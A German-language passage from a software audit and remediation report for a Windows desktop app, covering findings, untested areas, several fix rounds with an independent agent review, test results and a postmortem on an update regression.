3. **Befund 3 (mit 7, 17 und 18):** Datenverlust in der Zeiterfassungs-CSV.
4. **Befunde 5 und 6:** Nicht atomares Speichern bei settings.json und banner-backup.json mit Überschreiben nach Ladefehler.
5. **Befund 4:** Call-Routing ersetzt das gewählte Mikrofon, bei jedem Call.

## Nicht oder nur oberflächlich geprüft

- **Laufzeitverhalten:** Ich habe keine App gestartet. Nicht geprüft sind:
  - die echten HRESULTs beim Entfernen von Geräten und beim Neustart des Audiodiensts
  - die Fokuswirkung im Spiegelmodus
  - die CPU-Last des Puls-Storyboards
  - `LostMouseCapture`-Timing
  - WPF bei `WM_ENDSESSION`
- **Ical.Net intern:** TZID/Windows-Zonen, RRULE über DST, EXDATE mit TZID.
- **Fremdverhalten:**
  - Graph: Ganztagstermine bei `Prefer: UTC`; To-Do-`dueDateTime`.
  - Spotify: Token-Rotation.
  - Tailscale: Mark-of-the-Web.
  - Inno-Uninstaller: Restart Manager.
  - `certutil -delstore` bei mehreren Treffern.
  - Chromes „Local Network Access“.
- **Nur Stichproben:** `SettingsWindow.xaml` im Detail, `TimeTrackingWindow`, `UiStallMonitor`, `Snapshots.cs`, `ShortcutsService`, `WorkModeService`, `ContactsService`, die Anruf-Erkennung.
- **Nicht geprüft:** die tatsächlichen Release-Assets auf GitHub (ob `digest` vorhanden ist).

---

## Behebung und Nachprüfung

### Runde 1 (Commit `cba9fe8`)

Behoben sind alle Befunde 1–36 und der größte Teil von 37–43.

Nicht oder bewusst anders umgesetzt:

- **34:** Ein festes Signaturzertifikat braucht ein GitHub-Secret. Das ist offen. Der Uninstaller entfernt jetzt alle Zertifikate mit diesem Subject.
- **35:** Installation pro Benutzer wäre ein Umbau. Das bleibt offen.
- **37h:** NOTPRESENT-Endpunkte werden weiter abgefragt. Getrennte Bluetooth-Headsets brauchen den Pfad.
- **33:** Das Identitäts-Paket wird mit `DeferRegistrationWhenPackagesAreInUse` aktualisiert und greift beim nächsten Start. Es gibt keinen sofortigen Neustart und damit auch keine Neustart-Schleife.

Neue Tests: `AudioFixTests`, `PersistenceFixTests`, `SecurityFixTests`, `UiFixTests`. Die Zahl der Tests stieg von 108 auf 204.

### Runde 2 (Commit `a47bf8c`)

Eine adversariale Prüfung des Diffs von Runde 1 fand keine kritischen oder hohen Regressionen. Behoben wurde:

- **Skript-Widgets und Proxy:** Hinter einem System-Proxy funktionierten Skript-Widgets nicht mehr. Jetzt wird jedes Ziel geprüft, auch Redirects.
- **Microsoft-Backoff:** Er dauerte bis zu 30 min. Jetzt sind es höchstens 5 min, und bei Netz zurück oder nach dem Aufwachen wird sofort neu versucht.
- **Teams:**
  - Nach dem Zurückstellen stimmt die Ring-Anzeige wieder.
  - Wird eine Abmeldung abgebrochen, kommt „Nicht stören“ wieder.
  - Beim Beenden wartet die App nicht mehr zweimal je 3 s.
- **Zeiterfassung:**
  - Die Pausen-Frage nach dem Herunterfahren klappt auch mit Schnellstart. Maßgeblich ist jetzt die Anmeldezeit statt der Uptime.
  - Alte offene Einträge werden beim Zusammenführen geschlossen.
- **Vollbild-Wächter:** Ein maximiertes Fenster gilt nur mit Rahmen zum Größenändern als normales App-Fenster. Borderless-Spiele blenden die Insel weiter aus.
- **Claude:**
  - Sitzungen anderer PCs kommen nach dem Ausschalten nicht wieder.
  - Ordner mit `&` oder `;` sind erlaubt.
- **System-Karte:** Sie aktualisiert sich korrekt bei mehreren Inseln.
- **Banner-Backup:** Die Rückfall-Annahme gilt nur für den ersten Abgleich.
- **Kleinkram:** Temp-Dateien von Secrets werden entfernt. Zwischenablage-Bilder bleiben, solange ein defekter Verlauf beiseitegelegt ist.
- **Snapshot-Modus:** Er schreibt keine Nutzerdateien mehr, `AtomicFile` beachtet jetzt `ReadOnly`.

Bewusst belassen:

- Migration v10 schaltet Downloads auch für 1.0.15-Nutzer ein, die es abgeschaltet hatten. Das Release ist einen Tag alt, und die meisten Betroffenen hatten die Downloads wegen Befund 9 nie bekommen.
- CalDAV verlangt https.
- Ein Einfachklick aufs Tray-Symbol wartet die Doppelklickzeit ab.
- Der Claude-Listener startet nur mit den von DynamicBay eingetragenen Hooks.

### Runde 3

Ich habe die Änderungen aus Runde 2 und die UI-Fixes aus Runde 1 selbst nachgelesen: Peek-Warteschlange, Tray, Hotkeys, Spiegel-Monitor, Zahnräder und Notizen. Neue Fehler habe ich nicht gefunden.

### Runde 4: unabhängiger Agent

Ein neuer Agent ohne Vorwissen hat den Diff seit 1.0.15 und den übrigen Code geprüft. Er fand keine kritischen und keine hohen Befunde. Die Sicherheits-Fixes hat er nachvollzogen und als wirksam bestätigt. Seine Befunde, am Code nachgeprüft:

- **Skript-Netzwerkschutz über IPv6 (mittel):** Globale IPv6-Adressen im eigenen Netz waren erreichbar, z. B. die Router-Oberfläche oder ein NAS. Jetzt sind auch alle Adressen in den Netzen der eigenen Adapter gesperrt (`ScriptEngine.InLocalSubnet`, IPv4 und IPv6).
- **Banner nach verlorenem Backup (mittel/niedrig):** Ist `banner-backup.json` unlesbar, blieben bei Deinstallation oder abgeschalteter Unterdrückung alle Banner aus. Jetzt setzen `RestoreAll` und `Apply` die verbliebenen Nullen auf den Windows-Standard zurück. Ausgenommen sind die Apps, die gerade stumm bleiben sollen.
- **Kontakte leer bei kurzem Ausfall (niedrig):** Die Liste bleibt jetzt stehen, wenn keine der beiden Abfragen durchkam.
- **Token-Abfragen nach `invalid_grant` (niedrig):** Bis zur nächsten Anmeldung gibt es keine weiteren Token-Abfragen.
- **CalDAV-Zugangsdaten an Nachbar-Hosts (niedrig):** Nachbar-Hosts bekommen die Zugangsdaten nur noch bei bekannten Anbietern (iCloud, GMX, web.de). Sonst gilt das nur für den eigenen Host und Hosts darunter, weil bei `name.github.io` oder `*.co.uk` die Elterndomain Fremden gehört.
- **Zwischenablage-Bilder bei defektem Verlauf (niedrig):** Die Bilder bleiben noch zwei Wochen ab dem Beiseitelegen, danach räumt die Ablage wieder auf. `AtomicFile.SetAside` setzt dafür das Datum der Kopie.
- **Update-Prüfung später eingeschaltet (niedrig):** Der tägliche Timer läuft jetzt immer und prüft nur, wenn die Einstellung an ist.
- **Claude-Sitzungen nach dem Abschalten (niedrig):** `ScanAsync` prüft `_started` jetzt direkt nach dem Lesen.

Bewusst belassen:

- **Proxy-Pfad der Skripte:** Der Proxy löst den Namen selbst noch einmal auf (DNS-Rebinding möglich). Das betrifft nur Netze mit System-Proxy. Eine Lösung bräuchte einen eigenen Verbindungsaufbau über den Proxy.

### Tests in jeder Runde

- `dotnet build`: 0 Warnungen.
- `dotnet test`: 204 von 204 bestanden, nach Runde 4 218 von 218 (neu: Netz-Präfixe, CalDAV-Hosts).
- `ISCC` kompiliert das Installer-Skript fehlerfrei. Gebaut wurde in den Scratchpad, installiert wurde nichts.
- Snapshot-Modus mit allen Zuständen an allen Kanten: Die Darstellung ist unverändert. Ich habe vor und nach dem Lauf geprüft, dass `%AppData%\DynamicBay` nicht verändert wurde.
- Musik, Teams, Spotify und Graph wurden nicht angesprochen.
- **Nicht live getestet:** der zweite Start neben der laufenden Insel (Befund 2). Den Prozessstart hat der Auto-Modus blockiert.

### Nachtrag 1.0.17 und 1.0.18

- **33 war eine Regression:** Die verzögerte Registrierung verliert den externen Ort. Nach dem Update auf 1.0.17 startete die App nicht mehr („Fehler bei der Installation“). Seit 1.0.18 registriert der Installer das Paket, solange die App geschlossen ist; die App selbst nur noch ohne jede Identität. Details: `docs/postmortems/2026-10-11-identity-package.md`.
- **Update-Test:** `tools/update-smoke.ps1` prüft vor jedem Release auf einem frischen Windows 1.0.15 → 1.0.16 → neu. Gegen 1.0.17 schlägt er mit dem echten Fehler fehl.
- **34:** Build und Installer unterstützen jetzt das feste Zertifikat (`tools/new-signing-cert.ps1`), der Installer räumt alte Kopien auf. Offen bleibt nur, die GitHub-Secrets anzulegen.
- Weitere Fixes aus dem Abgleich mit ArtCraft: tolerante Parser mit API-Fixtures (Google ohne Start, leere Spotify-Einträge), Fehlertexte an einer Stelle (`ErrorText`), Gesten mit genau einem Ende (`PointerGesture`), Speicherprüfung ohne Leck. 336 Tests.
